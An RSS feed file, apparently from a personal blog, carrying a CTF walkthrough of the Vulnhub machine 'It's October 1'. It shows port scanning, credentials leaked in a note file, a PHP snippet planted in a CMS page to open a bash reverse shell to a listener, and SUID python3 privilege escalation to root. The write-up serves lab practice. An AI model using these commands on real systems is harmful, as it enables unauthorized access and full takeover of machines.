@@ -1,0 +1,102 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Balzabu 1337</title>
+    <description>I always loved IT, I can&#39;t do anything about it!
+</description>
+    <link>http://yourdomain.com/</link>
+    <atom:link href="http://yourdomain.com/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Wed, 15 Apr 2020 22:10:47 +0200</pubDate>
+    <lastBuildDate>Wed, 15 Apr 2020 22:10:47 +0200</lastBuildDate>
+    <generator>Jekyll v3.1.6</generator>
+    
+      <item>
+        <title>VULNHUB - It&#39;s October 1</title>
+        <description>&lt;h1 id=&quot;ctf-walkthrough&quot;&gt;CTF WALKTHROUGH&lt;/h1&gt;
+
+&lt;p&gt;&lt;strong&gt;Machine:&lt;/strong&gt; It’s October&lt;br /&gt;
+&lt;strong&gt;Creator:&lt;/strong&gt; Akanksha Sachin Verma&lt;br /&gt;
+&lt;strong&gt;IP:&lt;/strong&gt; 192.168.1.13&lt;br /&gt;
+&lt;strong&gt;Link:&lt;/strong&gt; https://www.vulnhub.com/entry/its-october-1,460/&lt;/p&gt;
+
+&lt;p&gt;This is a really easy CTF available on Vulnhub, let’s resolve it!&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;br /&gt;
+First thing I did,as always, is run a port scan to understand what services the machine is running.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nmap&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sV&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;T4&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;192.168&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.13&lt;/span&gt;
+
+&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt;   &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ssh&lt;/span&gt;     &lt;span class=&quot;no&quot;&gt;OpenSSH&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;7.9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Debian&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;deb10u2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protocol&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt;   &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;    &lt;span class=&quot;no&quot;&gt;Apache&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpd&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Debian&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;3306&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;   &lt;span class=&quot;no&quot;&gt;MySQL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unauthorized&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;8080&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;    &lt;span class=&quot;no&quot;&gt;Apache&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpd&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Debian&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;no&quot;&gt;Service&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;OS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Linux&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;CPE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cpe&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:linux:linux_kernel&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;So there are two webserver hosted at &lt;em&gt;http://192.168.1.13:80&lt;/em&gt; and &lt;em&gt;http://192.168.1.13:8080&lt;/em&gt;.
+&lt;br /&gt;
+I started by looking at the host &lt;em&gt;http://192.168.1.13:8080&lt;/em&gt; and found a file called &lt;em&gt;mynote.txt&lt;/em&gt; containing credentials.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;$  curl http://192.168.1.13:8080/
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mynote.txt&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;My Note&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$  curl http://192.168.1.13:8080/mynote.txt
+	user 		- admin
+	password 	- adminadmin2 &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Web-shell&lt;/strong&gt;&lt;br /&gt;
+The first question that bumped in my mind was: “Where can I use these credentials?” and for this reason i used &lt;em&gt;DirBuster&lt;/em&gt; to see if there’s any backend/login available. Note that BurpSuite can do this job easily even if there are alternative solutions such as &lt;em&gt;wfuzz&lt;/em&gt; that are alot faster.&lt;br /&gt;
+After running &lt;em&gt;DirBuster&lt;/em&gt; i almost instantly discovered the login page, located at: &lt;em&gt;http://192.168.1.13/backend&lt;/em&gt; and I was able to log-in.&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now it’s time to think about how to get a reverse shell, after trying some public exploits such as &lt;em&gt;CVE-2018-1999009&lt;/em&gt; and others nothing seemed to work.&lt;br /&gt;
+There was an option to upload new media files but the allowed extensions weren’t good to upload a shell.&lt;br /&gt;
+After a little bit of try harding I was able to get a reverse shell thanks to the &lt;em&gt;CMS&lt;/em&gt; section of the website.&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Run a local listener&lt;/li&gt;
+  &lt;li&gt;Create a New Page under &lt;em&gt;CMS-&amp;gt;Pages&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;Give random title and filename&lt;/li&gt;
+  &lt;li&gt;Add page with below source code&lt;/li&gt;
+  &lt;li&gt;Visit the page&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onstart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt; 
+    &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash -c &#39;bash -i &amp;gt; /dev/tcp/IPADDR/PORT 0&amp;gt;&amp;amp;1&#39;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nx&quot;&gt;curl&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;://&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;192.168&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.13&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nameofthepage&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;If you did everything correctly a shell will pop-up in the nc listener, to upgrade it to full TTY we just have to run&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Privilege escalation&lt;/strong&gt;&lt;br /&gt;
+Looking at the files on the webserver I found nothing interesting so I decided to look for SUID files with the following command:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And found out in the list &lt;em&gt;python3&lt;/em&gt; which is perfect to gain root privileges.&lt;br /&gt;
+What I had to do is simply run a python3 script that will create a tty shell with root privileges.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;import os; os.execl(&quot;/bin/bash&quot;,&quot;bash&quot;,&quot;-p&quot;)&#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;id
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;So now it’s time to cd into /root/ and see if we got the flag!&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/proof.txt
+Best of Luck
+&lt;span class=&quot;nv&quot;&gt;$2y$12$EUztpmoFH8LjEzUBVyNKw&lt;/span&gt;.9AKf37uZWPxJp.A3eop2ff0LbLYZrFq&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Nice, we PWNED it!!&lt;/p&gt;
+</description>
+        <pubDate>Wed, 15 Apr 2020 21:17:13 +0200</pubDate>
+        <link>http://yourdomain.com/ctf/2020/04/15/VULNHUB-It's-October-1.html</link>
+        <guid isPermaLink="true">http://yourdomain.com/ctf/2020/04/15/VULNHUB-It's-October-1.html</guid>
+        
+        
+        <category>ctf</category>
+        
+      </item>
+    
+  </channel>
+</rss>
